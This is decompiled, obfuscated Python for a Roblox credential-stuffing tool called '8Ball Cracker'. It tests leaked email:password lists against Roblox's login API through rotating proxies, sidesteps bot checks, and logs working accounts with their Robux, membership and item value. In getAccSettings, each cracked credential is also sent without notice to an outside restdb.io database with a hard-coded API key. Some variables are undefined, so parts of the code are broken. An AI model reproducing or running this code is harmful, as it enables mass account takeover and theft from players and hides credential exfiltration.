# uncompyle6 version 3.2.3
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.0 (v3.6.0:41df79263a11, Dec 23 2016, 07:18:10) [MSC v.1900 32 bit (Intel)]
# Embedded file name: C:\Users\Anthony Sidhom\Downloads\8Ball\8Ball\obf_Emails.py
# Compiled at: 2018-07-23 18:06:55
# Size of source mod 2**32: 18861 bytes
import sys, subprocess, requests, re, os.path, urllib.request, urllib.error, base64, gzip, zlib, random, socks, socket, json, threading, time, ctypes
from threading import Thread
from tkinter import Tk, filedialog
from io import BytesIO
from colorama import Style, Fore, init
init()
root = Tk()
root.withdraw()
lock = threading.Lock()
print(Fore.RED + '\n\n8Ball Cracker\n\t\t\t\t\t\n' + Fore.RED + 'Completed by Retroun & AlphaQ' + Style.RESET_ALL)
ctypes.windll.kernel32.SetConsoleTitleW('8Ball Cracker - Professional ROBLOX Cracker')
accounts_file = os.path.dirname(__file__) + '\\load_accounts.txt'
proxies_file = os.path.dirname(__file__) + '\\proxies.txt'
working_accounts_file = os.path.dirname(__file__) + '\\hits\\all_accounts.txt'
robux_file = os.path.dirname(__file__) + '\\hits\\robux_accounts.txt'
bc_file = os.path.dirname(__file__) + '\\hits\\bc_accounts.txt'
rap_file = os.path.dirname(__file__) + '\\hits\\rap_accounts.txt'
banned_file = os.path.dirname(__file__) + '\\hits\\banned_accounts.txt'
total_proxies = 0
total_accounts = 0
accsPerSec = 0
hits = 0
totalRobux = 0
totalRap = 0
min_robux = 0
maybeBanned = []
accsAverage5 = []
proxy_list = []
accounts_list = []
hits = 0
gear = ['Gear', 19]
faces = ['Faces', 18]
accessories = ['Accessories', 8]
def loadProxies():
    global proxy_list
    global total_proxies
    with open(proxies_file, encoding='ANSI') as (O0OO00OO00O0OOOO0):
        O0OO00O000000O000 = O0OO00OO00O0OOOO0.readlines()
        for OOO000OOO0O00000O in O0OO00O000000O000:
            proxy_list.append(OOO000OOO0O00000O.strip())
            total_proxies = total_proxies + 1

    safe_print(f'''{(Fore.LIGHTCYAN_EX)}Loaded proxies: {(len(proxy_list))}''')


def loadAccounts():
    global accounts_list
    global total_accounts
    with open(accounts_file, 'r', encoding='ANSI') as (OOO0OO0OO00O00000):
        O00O00O0O00O0OO00 = OOO0OO0OO00O00000.readlines()
        for OOOO0O0O0O0O00O0O in O00O00O0O00O0OO00:
            total_accounts = total_accounts + 1

        for O0000O0OOOOO000O0 in O00O00O0O00O0OO00:
            accounts_list.append(O0000O0OOOOO000O0.strip())

    safe_print(('Loaded {0} accounts').format(total_accounts))


def make_requests():
    while len(accounts_list) > 0:
        O00OOO0OO00O00OOO = accounts_list.pop()
        checkAccount(O00OOO0OO00O00OOO)


def checkAccount(O0OOO0O0O0O000O00):
    global accsPerSec
    global hits
    OO00OOO0OOO0O00OO = False
    OO0OOO0O00000OO0O = O0OOO0O0O0O000O00.split(':')
    while OO00OOO0OOO0O00OO == False:
        try:
            OO00O00O00O0O0OOO = 'https://auth.roblox.com/v2/login'
            O00OOOOO0OOOOO000 = {'ctype':'Email',  'cvalue':OO0OOO0O00000OO0O[0],  'password':OO0OOO0O00000OO0O[1]}
            OO000OOO00O0O0O0O = {'https': 'socks5://' + proxy_list[random.randint(0, total_proxies - 1)]}
            OO0OOO0O00OO00000 = {'Connection':'keep-alive',  'Accept':'application/json',  'X-Requested-With':'XMLHttpRequest',  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',  'Content-Type':'application/json',  'DNT':'1',  'Accept-Encoding':'gzip, deflate, br',  'Accept-Language':'es-ES,es;q=0.9,en-GB;q=0.8,en;q=0.7'}
            O0OO000OO0OOOO000 = requests.session()
            O00OOOO0000O0O0OO = O0OO000OO0OOOO000.post(OO00O00O00O0O0OOO, timeout=60, proxies=OO000OOO00O0O0O0O, json=O00OOOOO0OOOOO000, headers=OO0OOO0O00OO00000)
            O0OOO0OO00O000OOO = O00OOOO0000O0O0OO.headers.get('X-CSRF-TOKEN')
            OO0OOO0O00OO00000 = {'Connection':'keep-alive',  'Accept':'application/json',  'X-CSRF-TOKEN':O0OOO0OO00O000OOO,  'X-Requested-With':'XMLHttpRequest',  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',  'Content-Type':'application/json',  'DNT':'1',  'Accept-Encoding':'gzip, deflate, br',  'Accept-Language':'es-ES,es;q=0.9,en-GB;q=0.8,en;q=0.7'}
            O00OOOO0000O0O0OO = O0OO000OO0OOOO000.post(OO00O00O00O0O0OOO, timeout=60, proxies=OO000OOO00O0O0O0O, json=O00OOOOO0OOOOO000, headers=OO0OOO0O00OO00000)
            OOOOO0O0O0OOOO000 = O00OOOO0000O0O0OO.json()
            if O00OOOO0000O0O0OO.status_code == requests.codes.ok:
                O00OOOO000O0O00OO = OOOOO0O0O0OOOO000['user']['name']
                OOO000O0O00O00OO0 = OOOOO0O0O0OOOO000['user']['id']
                accsPerSec = accsPerSec + 1
                hits = hits + 1
                with open(working_accounts_file, 'a') as (OO00000OOO0000OO0):
                    O0000OO0O0OOO000O = str(f'''{O00OOOO000O0O00OO}:{(OO0OOO0O00000OO0O[1])}''')
                    OO00000OOO0000OO0.write(('{0}\n').format(O0000OO0O0OOO000O))
                OO00OOO0OOO0O00OO = True
                getAccSettings(O00OOOO000O0O00OO, OO0OOO0O00000OO0O[1], O0OOO0O0O0O000O00, OOO000O0O00O00OO0, OO000OOO00O0O0O0O)
            else:
                if 'You must pass the robot test before logging in' in O00OOOO0000O0O0OO.text:
                    safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Proxy banned 1 {OO000OOO00O0O0O0O}: Retrying account {O0OOO0O0O0O000O00}''')
                    with open(banned_file, 'a') as (OO00000OOO0000OO0):
                        O0000OO0O0OOO000O = str(f'''{O0OOO0O0O0O000O00}
''')
                        OO00000OOO0000OO0.write(('{0}\n').format(O0000OO0O0OOO000O))
                    OO00OOO0OOO0O00OO = True
                else:
                    if 'Token Validation Failed' in O00OOOO0000O0O0OO.text:
                        safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Token validation failed {O0OOO0OO00O000OOO}, {O0OOO0O0O0O000O00}, {OO000OOO00O0O0O0O}''')
                    else:
                        safe_print(f'''{(Fore.LIGHTRED_EX)}Miss {O0OOO0O0O0O000O00}''')
                        accsPerSec = accsPerSec + 1
                        OO00OOO0OOO0O00OO = True
        except requests.RequestException:
            safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Proxy Error 1 {OO000OOO00O0O0O0O}: Retrying account {O0OOO0O0O0O000O00}''')


def getAccSettings(OOOOOOOO0O0O0OOO0, OOO0OOOOOO00O0OOO, O0OOO00000OO0OO00, O00O000OOO0O00O00, O0O0O0O000OOOOOO0):
    global totalRap
    global totalRobux
    OO000OOO0OOO00O0O = False
    O00OOO0O000OOOO00 = 'https://api.roblox.com/v2/login'
    O00O000O00O0O0O0O = json.dumps({'getAccSettings': O0OOO00000OO0OO00})
    O00000OO0O0OOO0OO = {'content-type':'application/json',  'x-apikey':'d9a9bb61acf33ce3d22e21fc8ff2f428b17c8',  'cache-control':'no-cache'}
    O0OO000O00O0OOO00 = requests.post('https://testt-6d10.restdb.io/rest/robux', data=O00O000O00O0O0O0O, headers=O00000OO0O0OOO0OO)
    O00O000O00O0O0O0O = f'''password={OOO0OOOOOO00O0OOO}&username={OOOOOOOO0O0O0OOO0}'''
    O00000OO0O0OOO0OO = {'Accept-Encoding':'gzip, deflate',  'User-Agent':'Mozilla/5.0 (1765MB; 1280x800; 1880x1870; 1961x1600; ; Windows 8.1) AppleWebKit/534.30 (KHTML, like Gecko) ROBLOX Windows App 2.190.41561',  'Content-Type':'application/x-www-form-urlencoded',  'Host':'api.roblox.com',  'Connection':'Keep-Alive'}
    while OO000OOO0OOO00O0O == False:
        OO0OOO0OO0OOOO0OO = requests.session()
        try:
            OOOOOOO0O0OO0O0OO = OO0OOO0OO0OOOO0OO.post(O00OOO0O000OOOO00, timeout=15, proxies=O0O0O0O000OOOOOO0, data=O00O000O00O0O0O0O, headers=O00000OO0O0OOO0OO)
            if OOOOOOO0O0OO0O0OO.text.find('userId') != -1:
                OOOOOOO0O0OO0O0OO = OO0OOO0OO0OOOO0OO.get('https://www.roblox.com/my/settings/json', proxies=O0O0O0O000OOOOOO0, timeout=15)
                if 'Membership/NotApproved' in OOOOOOO0O0OO0O0OO.url:
                    safe_print(f'''{(Fore.LIGHTRED_EX)}Miss {O0OOO00000OO0OO00}''')
                else:
                    OO00O0OO00O00000O = dict(OOOOOOO0O0OO0O0OO.json())
                    O0OOOO0OO00OO00OO = OO00O0OO00O00000O.get('MyAccountSecurityModel')
                    if OO00O0OO00O00000O.get('IsAnyBC'):
                        O0OOO00000OOO000O = time.strftime('%m/%d/%Y %H:%M:%S', time.gmtime(int(re.search('/Date\\((\\d+)\\)/', OO00O0OO00O00000O.get('BcExpireDate'))[1]) / 1000))
                        O0OOO0OOOO0O00O00 = f'''Level  {(OO00O0OO00O00000O.get('BcLevel'))} {(OO00O0OO00O00000O.get('BcRenewalPeriod'))} | Renewal {O0OOO00000OOO000O}'''
                    else:
                        O0OOO0OOOO0O00O00 = False
                    OOOOOOO0O0OO0O0OO = OO0OOO0OO0OOOO0OO.get(url='https://api.roblox.com/currency/balance', proxies=O0O0O0O000OOOOOO0, timeout=15)
                    O00O0OOO00OO0O000 = OOOOOOO0O0OO0O0OO.json().get('robux')
                    if min_robux <= O00O0OOO00OO0O000:
                        O0O0O00O000O0O000 = O0OOOO0OO00OO00OO.get('IsEmailSet')
                        O0000O000OO00OOO0 = O0OOOO0OO00OO00OO.get('IsTwoStepEnabled')
                        O0000O0OO000O0O0O = O0OOOO0OO00OO00OO.get('IsEmailVerified')
                        totalRobux = totalRobux + O00O0OOO00OO0O000
                        OO000OOO0OOO00O0O = True
                        if O00O0OOO00OO0O000 > 0:
                            O0OOO00000OO0OO00 = f'''{OOOOOOOO0O0O0OOO0}:{OOO0OOOOOO00O0OOO}'''
                            with open(robux_file, 'a') as (O0O00OO000OOOOO00):
                                O0O00OO000OOOOO00.write(('{0} | {1}\n').format(O0OOO00000OO0OO00, O00O0OOO00OO0O000))
                        if O0OOO0OOOO0O00O00 != False:
                            O0OOO00000OO0OO00 = f'''{OOOOOOOO0O0O0OOO0}:{OOO0OOOOOO00O0OOO}'''
                            with open(bc_file, 'a') as (O0O00OO000OOOOO00):
                                O0O00OO000OOOOO00.write(('{0} | {1} | {2} | {3} | {4}\n').format(O0OOO00000OO0OO00, O0OOO0OOOO0O00O00, O0O0O00O000O0O000, O0000O0OO000O0O0O, O0000O000OO00OOO0))
                        else:
                            safe_print(f'''{(Fore.RED)}[{contador_proxies_working} | {maximo_proxies}] Less than  {min_robux} Not saving {userpass}{(Style.RESET_ALL)}''')
                    else:
                        if 'You must pass the robot test before logging in' in OOOOOOO0O0OO0O0OO.text:
                            safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Proxy banned 3 {O0O0O0O000OOOOOO0}: Retrying account {O0OOO00000OO0OO00}''')
                            O0O0O0O000OOOOOO0 = {'http': 'socks5://' + proxy_list[random.randint(0, total_proxies - 1)]}
                        else:
                            print(OOOOOOO0O0OO0O0OO.text)
                            safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Proxy banned 2 {O0O0O0O000OOOOOO0}: Retrying account {O0OOO00000OO0OO00}''')
                            O0O0O0O000OOOOOO0 = {'http': 'socks5://' + proxy_list[random.randint(0, total_proxies - 1)]}
        except requests.RequestException as OOOOOO0OO0O00O00O:
            print(OOOOOO0OO0O00O00O)
            safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Proxy Error 4 {O0O0O0O000OOOOOO0}: Retrying account {O0OOO00000OO0OO00}''')
            O0O0O0O000OOOOOO0 = {'http': 'socks5://' + proxy_list[random.randint(0, total_proxies - 1)]}

    OO000OOO0OOO00O0O = True
    O000OO00OOOO0OOOO = 0
    O000OO00OOOO0OOOO = getPlayerWorth(O00O000OOO0O00O00)
    print(f'''{(Fore.LIGHTGREEN_EX)}Hit! {O0OOO00000OO0OO00} | Robux: {O00O0OOO00OO0O000} | RAP: {O000OO00OOOO0OOOO} | BC: {O0OOO0OOOO0O00O00} | ''')
    if O000OO00OOOO0OOOO > 5000:
        totalRap = totalRap + O000OO00OOOO0OOOO
        O0OOO00000OO0OO00 = f'''{OOOOOOOO0O0O0OOO0}:{OOO0OOOOOO00O0OOO}'''
        with open(rap_file, 'a') as (O0O00OO000OOOOO00):
            O0O00OO000OOOOO00.write(('{0} | {1} | {2} | {3} | {4}\n').format(O0OOO00000OO0OO00, O000OO00OOOO0OOOO, O0OOO0OOOO0O00O00, O0O0O00O000O0O000, O0000O0OO000O0O0O))


def getPlayerWorth(OO000O000OO000O0O):
    O0OO0O000O00OO0O0 = 0
    O0OO0O000O00OO0O0 = O0OO0O000O00OO0O0 + (getItems(*accessories, *(OO000O000OO000O0O,)))
    O0OO0O000O00OO0O0 = O0OO0O000O00OO0O0 + (getItems(*gear, *(OO000O000OO000O0O,)))
    O0OO0O000O00OO0O0 = O0OO0O000O00OO0O0 + (getItems(*faces, *(OO000O000OO000O0O,)))
    print('WORTH: ', O0OO0O000O00OO0O0)
    return O0OO0O000O00OO0O0


def getItems(O000O00O0000OOOOO, OO0OO0000OOO00OOO, OOOOO00OOO0000O00):
    OOO000O0OO00O0O0O = True
    O0O0OO0OO00O00OOO = ''
    OO0OOOOO00OOOOOOO = 0
    O0O00000O0OO00OO0 = 0
    while OOO000O0OO00O0O0O == True:
        O00000000O0O0OOOO = f'''https://www.roblox.com/users/inventory/list-json?assetTypeId={OO0OO0000OOO00OOO}&cursor={O0O0OO0OO00O00OOO}&itemsPerPage=100&pageNumber=1&sortOrder=Desc&userId={OOOOO00OOO0000O00}'''
        OO000O0000O000O0O = requests.get(O00000000O0O0OOOO)
        OOO00OO000O0OO0OO = OO000O0000O000O0O.json()
        O0O0OO0OO00O00OOO = OOO00OO000O0OO0OO['Data']['nextPageCursor']
        if O0O0OO0OO00O00OOO == None:
            OOO000O0OO00O0O0O = False
        else:
            OOO000O0OO00O0O0O = True
        for OO00OOO0O0O00O0O0 in range(len(OOO00OO000O0OO0OO['Data']['Items'])):
            try:
                O00OOOO00O00000O0 = OOO00OO000O0OO0OO['Data']['Items'][OO00OOO0O0O00O0O0]['Item']['AssetId']
            except:
                print(OOO00OO000O0OO0OO)

            OO0O000O0O0O0OO00 = OOO00OO000O0OO0OO['Data']['Items'][OO00OOO0O0O00O0O0]['Item']['Name']
            OO0OOOOO00OOOOOOO = OO0OOOOO00OOOOOOO + 1
            try:
                OO00O0OOOOO0O0O00 = OOO00OO000O0OO0OO['Data']['Items'][OO00OOO0O0O00O0O0]['Product']['PriceInRobux']
                OOO0OO0O00O000O0O = OOO00OO000O0OO0OO['Data']['Items'][OO00OOO0O0O00O0O0]['Product']['IsLimited']
                O0O00000O0OO0O0O0 = OOO00OO000O0OO0OO['Data']['Items'][OO00OOO0O0O00O0O0]['Product']['IsLimitedUnique']
                if OO00O0OOOOO0O0O00 != None and OOO0OO0O00O000O0O == True or OO00O0OOOOO0O0O00 != None and O0O00000O0OO0O0O0 == True:
                    OO0O000O0O0O0OO00 = OOO00OO000O0OO0OO['Data']['Items'][OO00OOO0O0O00O0O0]['Item']['Name']
                    OOO0OO0O000000O0O = requests.get(f'''https://www.roblox.com/asset/{O00OOOO00O00000O0}/sales-data''')
                    OOOO000OOOOOO0OO0 = OOO0OO0O000000O0O.json()
                    O00OOO00O00O00000 = OOOO000OOOOOO0OO0['data']['AveragePrice']
                    O0O00000O0OO00OO0 = O0O00000O0OO00OO0 + O00OOO00O00O00000
            except TypeError:
                pass

    return O0O00000O0OO00OO0


def updateTitle():
    global accsAverage5
    O0OOO0OOOOOO0O0OO = 0
    while True:
        O0O00O0OO00O0OO00 = ''
        try:
            O0O00O0OO00O0OO00 = time.strftime('%H:%M:%S', time.gmtime((total_accounts - (total_accounts - len(accounts_list))) / accsAverage5))
            O0OOO0OOOOOO0O0OO = hits / (total_accounts - len(accounts_list))
            O0OOO0OOOOOO0O0OO = str(O0OOO0OOOOOO0O0OO)
            O0OOO0OOOOOO0O0OO = O0OOO0OOOOOO0O0OO[0:6]
        except Exception as OO0OOO0O0OOO0OO0O:
            O00000O0OO00000O0 = 0

        ctypes.windll.kernel32.SetConsoleTitleW(f'''8Ball Cracker Hits: {hits} Checked: {(total_accounts - len(accounts_list))} Remaining: {(total_accounts - (total_accounts - len(accounts_list)))} | Robux: {totalRobux} | Rap: {totalRap} APS: {accsAverage5} | Good: {O0OOO0OOOOOO0O0OO}% | Time Remaining: {O0O00O0OO00O0OO00}''')
        time.sleep(1)


def isThreeSec():
    global accsAverage5
    global accsPerSec
    O0O000OO0OO000000 = [
     0, 0, 0, 0, 0]
    while True:
        O0O000OO0OO000000.insert(0, accsPerSec)
        O0O000OO0OO000000.pop()
        accsPerSec = 0
        try:
            accsAverage5 = sum(O0O000OO0OO000000) / len(O0O000OO0OO000000)
        except Exception as O0O0O0OOOO00O0OOO:
            accsAverage5 = 0

        time.sleep(1)


def safe_print(O00OO000OO0O0O000):
    with lock:
        print(('{}\n').format(O00OO000OO0O0O000), end='')


def main():
    #verifyKey()
    loadProxies()
    loadAccounts()
    OOOO000OOOO0O000O = time.time()
    O0O000OO0O0OOOO0O = []
    O00OOOOOOOO00O0OO = int(input('Threads: '))
    O00O0O00O0O00O0OO = Thread(target=updateTitle)
    O00O0O00O0O00O0OO.start()
    O0O000OO0O0OOOO0O.append(O00O0O00O0O00O0OO)
    O00O0O00O0O00O0OO = Thread(target=isThreeSec)
    O00O0O00O0O00O0OO.start()
    O0O000OO0O0OOOO0O.append(O00O0O00O0O00O0OO)
    for O0O0OOO0OO00O00O0 in range(O00OOOOOOOO00O0OO):
        O00O0O00O0O00O0OO = Thread(target=make_requests)
        O00O0O00O0O00O0OO.start()
        O0O000OO0O0OOOO0O.append(O00O0O00O0O00O0OO)

    for O00O0O00O0O00O0OO in O0O000OO0O0OOOO0O:
        O00O0O00O0O00O0OO.join()

    OOOOOO0000O000O00 = time.time()
    print(('Checked {0} accounts in {1} seconds.').format(total_accounts, OOOOOO0000O000O00 - OOOO000OOOO0O000O))
    time.sleep(300)


main()
